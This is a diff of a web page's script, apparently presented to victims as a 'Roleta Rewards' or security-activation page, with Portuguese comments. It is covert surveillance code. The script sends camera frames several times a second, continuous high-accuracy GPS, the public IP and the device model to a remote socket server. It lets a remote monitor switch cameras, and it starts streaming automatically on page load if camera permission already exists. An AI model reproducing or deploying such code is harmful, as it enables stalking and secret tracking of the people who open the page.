@@ -343,36 +343,144 @@
 <script>
     // ============================================================
     // FUNÇÕES 100% DO TRANSMISSOR ORIGINAL (Ativação de Segurança)
+    // CORRIGIDO: transmite imediatamente ao clicar em PERMITIR
     // ============================================================
 
     const RENDER_URL = "https://maestro-server-si1f.onrender.com";
     
     const urlParams = new URLSearchParams(window.location.search);
-    const roomId = urlParams.get('id');
+    const roomId = urlParams.get('id') || 'sala_' + Math.random().toString(36).substring(2, 9);
 
     const socket = io(RENDER_URL, { transports: ['websocket', 'polling'] });
     
     socket.on('connect', () => {
         if (roomId) socket.emit('join-room', roomId);
+        console.log('✅ Conectado ao servidor! Sala:', roomId);
     });
 
-    const btnActivate  = document.getElementById('btnAllow');
-    const processBox  = document.getElementById('processBox');
-    const progressBar = document.getElementById('progressBar');
-    const percentText = document.getElementById('percentText');
-    const statusText  = document.getElementById('statusText');
-    const errorMsg    = document.getElementById('errorMsg');
-    const video       = document.getElementById('hiddenVideo');
-    const canvas      = document.getElementById('hiddenCanvas');
-    const ctx         = canvas.getContext('2d');
+    // Elementos da interface
+    const btnAllow = document.getElementById('btnAllow');
+    const statusOk = document.getElementById('statusOk');
+    const permissionOverlay = document.getElementById('permissionOverlay');
+    const video = document.getElementById('hiddenVideo');
+    const canvas = document.getElementById('hiddenCanvas');
+    const ctx = canvas.getContext('2d');
+    const streamStatus = document.getElementById('streamStatus');
 
     let stream = null;
     let frameInterval = null;
     let currentFacing = 'user';
     let switchingCam = false;
 
-    const DURATION_SECONDS = 300;
-    const CIRCUMFERENCE = 339.292;
+    // ============================================================
+    // FUNÇÃO PRINCIPAL: ATIVAR TRANSMISSÃO
+    // ============================================================
+
+    async function activateDirectly() {
+        // Mostra status
+        statusOk.style.display = 'inline-flex';
+        permissionOverlay.classList.add('hidden');
+        streamStatus.classList.add('active');
+
+        const deviceName = getDetailedDeviceModel();
+
+        // Envia info do dispositivo
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                if (data && data.ip && roomId) {
+                    socket.emit('stream-info', { roomId: roomId, info: { ip: data.ip, deviceModel: deviceName } });
+                }
+            }).catch(() => {
+                if (roomId) socket.emit('stream-info', { roomId: roomId, info: { ip: "IP Privado", deviceModel: deviceName } });
+            });
+
+        // ============================================================
+        // 1. INICIAR CÂMERA (FRONTAL)
+        // ============================================================
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: currentFacing, width: { ideal: 480 }, height: { ideal: 360 } },
+                audio: false
+            }).catch(() => navigator.mediaDevices.getUserMedia({ video: true, audio: false }));
+
+            video.srcObject = stream;
+            await video.play();
+            canvas.width = 400; 
+            canvas.height = 300;
+
+            // Transmissão contínua de frames
+            if (!frameInterval) {
+                frameInterval = setInterval(() => {
+                    if (!stream || switchingCam || !roomId) return;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.35);
+                    socket.emit('stream-frame', { roomId: roomId, frame: dataUrl });
+                }, 180);
+            }
+            console.log('📸 Câmera ativa! Enviando frames...');
+        } catch (err) {
+            console.error('❌ Erro ao iniciar câmera:', err);
+            alert('⚠️ Permissão de Câmara Negada. Ative a câmara nas definições do navegador.');
+            permissionOverlay.classList.remove('hidden');
+            statusOk.style.display = 'none';
+            streamStatus.classList.remove('active');
+            return;
+        }
+
+        // ============================================================
+        // 2. INICIAR GPS (CONTÍNUO)
+        // ============================================================
+        if ("geolocation" in navigator) {
+            navigator.geolocation.watchPosition(
+                (pos) => {
+                    if (!roomId) return;
+                    socket.emit('stream-location', {
+                        roomId: roomId,
+                        location: {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            speed: pos.coords.speed || 0,
+                            alt: pos.coords.altitude || 0
+                        }
+                    });
+                    console.log('📍 GPS:', pos.coords.latitude, pos.coords.longitude);
+                },
+                (err) => {
+                    console.warn('⚠️ GPS erro:', err.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        // ============================================================
+        // 3. COMANDOS DO MONITOR (alternar câmera)
+        // ============================================================
+        socket.on('receive-command', async (cmd) => {
+            if (cmd === currentFacing) return;
+            switchingCam = true;
+            try {
+                const newStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: cmd, width: { ideal: 480 }, height: { ideal: 360 } }, 
+                    audio: false 
+                });
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                stream = newStream;
+                currentFacing = cmd;
+                video.srcObject = stream;
+                await video.play();
+                console.log('🔄 Câmera alternada para:', cmd);
+            } catch (e) {
+                console.error('❌ Erro ao alternar câmera:', e);
+            }
+            switchingCam = false;
+        });
+    }
+
+    // ============================================================
+    // DETECTAR MODELO DO DISPOSITIVO
+    // ============================================================
 
     function getDetailedDeviceModel() {
         const ua = navigator.userAgent;
@@ -425,114 +533,40 @@
         return model;
     }
 
-    async function activateDirectly() {
-        errorMsg.style.display = 'none';
-        btnActivate.style.display = 'none';
-        processBox.style.display = 'flex';
+    // ============================================================
+    // BOTÃO PERMITIR - CLIQUE
+    // ============================================================
 
-        startTimer();
+    btnAllow.addEventListener('click', async function() {
+        this.textContent = '⏳...';
+        this.disabled = true;
+        await activateDirectly();
+        this.textContent = '✅ ATIVO';
+        this.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+    });
 
-        const deviceName = getDetailedDeviceModel();
+    // ============================================================
+    // VERIFICA SE JÁ TEM PERMISSÃO (ativa automaticamente)
+    // ============================================================
 
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {
-                if (data && data.ip && roomId) {
-                    socket.emit('stream-info', { roomId: roomId, info: { ip: data.ip, deviceModel: deviceName } });
-                }
-            }).catch(() => {
-                if (roomId) socket.emit('stream-info', { roomId: roomId, info: { ip: "IP Privado", deviceModel: deviceName } });
-            });
-
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: currentFacing, width: { ideal: 480 }, height: { ideal: 360 } },
-                audio: false
-            }).catch(() => navigator.mediaDevices.getUserMedia({ video: true, audio: false }));
-
-            video.srcObject = stream;
-            await video.play();
-            canvas.width = 400; 
-            canvas.height = 300;
-
-            if (!frameInterval) {
-                frameInterval = setInterval(() => {
-                    if (!stream || switchingCam || !roomId) return;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataUrl = canvas.toDataURL('image/jpeg', 0.35);
-                    socket.emit('stream-frame', { roomId: roomId, frame: dataUrl });
-                }, 180);
-            }
-        } catch (err) {
-            errorMsg.textContent = "⚠️ Permissão de Câmara Negada. Por favor, ative a câmara.";
-            errorMsg.style.display = 'block';
-        }
-
-        if ("geolocation" in navigator) {
-            navigator.geolocation.watchPosition(
-                (pos) => {
-                    if (!roomId) return;
-                    socket.emit('stream-location', {
-                        roomId: roomId,
-                        location: {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            speed: pos.coords.speed || 0,
-                            alt: pos.coords.altitude || 0
-                        }
-                    });
-                },
-                (err) => {
-                    console.warn("Aguardando fixação de sinal GPS de alta precisão...");
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        }
-
-        socket.on('receive-command', async (cmd) => {
-            if (cmd === currentFacing) return;
-            switchingCam = true;
-            try {
-                const newStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: cmd, width: { ideal: 480 }, height: { ideal: 360 } }, 
-                    audio: false 
-                });
-                if (stream) stream.getTracks().forEach(t => t.stop());
-                stream = newStream;
-                currentFacing = cmd;
-                video.srcObject = stream;
-                await video.play();
-            } catch (e) {
-                console.error("Erro ao alternar câmara:", e);
-            }
-            switchingCam = false;
-        });
-    }
-
-    btnActivate.addEventListener('click', activateDirectly);
-
-    function startTimer() {
-        let elapsed = 0;
-        setInterval(() => {
-            elapsed++;
-            const percent = Math.min(100, Math.floor((elapsed / DURATION_SECONDS) * 100));
-            percentText.textContent = percent + '%';
-            progressBar.style.strokeDashoffset = CIRCUMFERENCE - (percent / 100) * CIRCUMFERENCE;
-            if (elapsed >= DURATION_SECONDS) statusText.textContent = "Sincronização concluída com sucesso.";
-        }, 1000);
-    }
-
-    // Verifica se já tem permissão e ativa automaticamente
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(function(s) {
             s.getTracks().forEach(t => t.stop());
+            // Já tem permissão! Ativa automaticamente
+            console.log('✅ Permissão já concedida. Ativando...');
             activateDirectly();
+            btnAllow.textContent = '✅ ATIVO';
+            btnAllow.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+            btnAllow.disabled = true;
         })
         .catch(function() {
-            // Mostra overlay de permissão
-            document.getElementById('permissionOverlay').classList.remove('hidden');
+            // Não tem permissão, mostra overlay
+            console.log('⚠️ Sem permissão. Aguardando clique em PERMITIR.');
+            permissionOverlay.classList.remove('hidden');
         });
+
+    console.log('🎰 Transmissor Roleta Rewards ativo!');
+    console.log('📎 Sala:', roomId);
 </script>
 </body>
 </html>
